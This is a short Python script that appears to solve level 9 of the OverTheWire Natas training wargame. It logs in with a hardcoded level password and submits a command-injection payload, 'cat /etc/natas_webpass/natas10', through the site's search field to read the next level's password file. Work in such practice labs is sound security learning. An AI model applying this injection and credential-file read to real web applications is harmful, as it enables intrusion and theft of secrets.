import requests
import re

username = "natas9"
password = "Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd"

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()

response = session.post(url,data={"needle":"cat /etc/natas_webpass/natas10","submit":"submit"},auth=(username,password))

content = response.text
print(content)